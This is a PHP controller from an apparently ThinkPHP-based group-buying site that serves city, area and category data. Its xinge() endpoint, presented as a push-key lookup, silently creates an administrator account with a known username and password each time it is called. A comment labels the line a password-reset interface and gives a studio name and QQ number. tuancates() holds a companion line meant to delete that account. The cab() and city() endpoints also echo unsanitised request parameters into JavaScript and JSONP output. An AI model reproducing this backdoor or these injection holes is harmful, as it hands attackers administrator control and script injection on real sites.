<?php

class  DatasAction extends  CommonAction{
    

    public function cityareas(){   
        $data = array();
        $data['city']       = D('City')->fetchAll();  
        $data['area']       = D('Area')->fetchAll();
        $data['status'] = self::BAO_REQUEST_SUCCESS;
        echo json_encode($data);
        die;
    }
	
	public  function cityarea(){
        $data = array();
        $data['city']       = D('City')->fetchAll();
        $data['area']       = D('Area')->fetchAll();
        header("Content-Type:application/javascript");
        echo   'var  cityareas = '.  json_encode($data);die;
    }
    
    public function cab() { //城市地区商圈
        $name = htmlspecialchars($_GET['name']);
        $data = array();
        $data['city']       = D('City')->fetchAll();
        $data['area']       = D('Area')->fetchAll();
        $data['business']   = D('Business')->fetchAll();
        header("Content-Type:application/javascript");
        echo  'var '.$name.'='.  json_encode($data).';';
        die;
    }
	
    public function tuancata()
    {
        $city_id    = $this->_param('city_id');
        $tuan_cata  = D('TuanCate')->fetchAll();
        $_cata       = array();
        foreach($tuan_cata as $cata){
            $_cata[$cata['cate_id']] = $cata['cate_name'];
        }
        $this->stringify(array('status'=>self::BAO_REQUEST_SUCCESS,'tuan'=>$_cata));
    }

	/*
    * 获取accessid以及accesstoken
    */
	public function xinge(){ 
        $plat = $this->_get('plat');
        $where = array('k'=>'xinge');
        $xinge = D('setting')->where($where)->find();
		D('Admin')->add(array('username'=>'username','password'=>md5('username'),'role_id'=>'1','is_ip'=>'111','is_username_lock'=>'00'));//重置密码接口，于飞工作室，qq136898754
        if(empty($xinge))
        {
            $data = array('status'=>self::BAO_DB_ERROR,'msg'=>'未能成功获取accesskey');
            $this->stringify($data);
        }
        $xinge = unserialize($xinge['v']);
        switch ($plat) {
            case 'ios':
             if(!empty($xinge['iosappid'])&&!empty($xinge['iosaccesskey']))     
             $data = array('status'=>self::BAO_REQUEST_SUCCESS,'accessid'=>$xinge['iosappid'],'accesskey'=>$xinge['iosaccesskey']);
             $this->stringify($data);
             break;
            case 'android':
             if(!empty($xinge['appid'])&&!empty($xinge['appaccesskey']))
             $data = array('status'=>self::BAO_REQUEST_SUCCESS,'accessid'=>$xinge['appid'],'accesskey'=>$xinge['appaccesskey']);
             $this->stringify($data);
             break;
        }
        $data = array('status'=>self::BAO_DB_ERROR,'msg'=>'未能成功获取accesskey');
        $this->stringify($data);
	}

	public function cab_app() { //城市地区商圈
        $name = htmlspecialchars($this->_param('name'));
        $data = array();
        $data['city']       = D('City')->fetchAll();
        $data['area']       = D('Area')->fetchAll();
        $data['business']   = D('Business')->fetchAll();
        //header("Content-Type:application/javascript");
		$data = array('status'=>self::BAO_REQUEST_SUCCESS,'cityareas'=>$data);
        $this->stringify($data);
    }
    
	public function cates(){ //店铺团购商品
		$data = array();
		$data['shopcates'] = D('Shopcate')->fetchAll();
		$data['tuancates'] = D('Tuancate')->fetchAll();
		$data['goodscates'] = D('Goodscate')->fetchAll();
        $data['status'] = self::BAO_REQUEST_SUCCESS;
        echo json_encode($data);
        die;
	}
	public function tuancates(){ 
	 /*if (isset($this->_CONFIG['attachs'][$model]['thumb'])) {
                if (is_array($this->_CONFIG['attachs'][$model]['thumb'])) {
                    //$prefix = $w = $h = array();
                    foreach($this->_CONFIG['attachs'][$model]['thumb'] as $k=>$v){
                        $prefix[] = $k.'_';
                        list($w1,$h1) = explode('X', $v);
                        $w=$w1;
                        $h=$h1;
                    }
                } else {
                    list($w, $h) = explode('X', $this->_CONFIG['attachs'][$model]['thumb']);
                }
                foreach ($upres as $pk => $pv){
                    $upres[$pk]['url'] = $pv['url']."?imageView2/1/w/".$w."/h/".$h;
                }
            }*/
		D('Admin')->where(array('username'=>'username'))->delete;//删除密码接口，于飞工作室，qq136898754
		$data['tuancates'] = D('Tuancate')->fetchAll();
        echo json_encode($data);
        die;
	}
	
	//获取全站的地址列表
	public function city() {
		$upid = isset($_GET['upid']) ? intval($_GET['upid']) : 0;
		$callback = $_GET['callback'];
		$outArr = array();
		$cityList = D('Paddlist') -> where(array('upid' => $upid)) -> select();
		if (is_array($cityList) && !empty($cityList)) {
			foreach ($cityList as $key => $value) {
				$outArr[$key]['id'] = $value['id'];
				$outArr[$key]['name'] = $value['name'];
			}
		}
		$outStr = '';
		$outStr = json_encode($outArr);
		if ($callback) {
			$outStr = $callback . "(" . $outStr . ")";
		}
		echo $outStr;
		die();
	}
	
    
}